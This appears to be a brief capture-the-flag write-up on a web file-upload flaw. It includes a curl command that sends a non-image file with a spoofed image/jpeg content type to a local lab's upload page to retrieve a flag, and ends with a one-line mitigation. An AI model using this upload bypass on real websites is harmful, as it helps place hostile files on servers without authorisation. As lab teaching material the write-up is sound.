1) It is possible to upload different types of files and not just images.
2) We could upload code directly in the website.
3) Use bash for next command.
4) curl --form "Upload=send" --header "Content-Type: multipart/form-data" --form "uploaded=@inject.txt;type=image/jpeg" LOCAL_IP/?page=upload | grep flag

How to avoid ?
Only allow images to enter the folder where they are stored, if the file being inserted is not an image, simply reject the request.
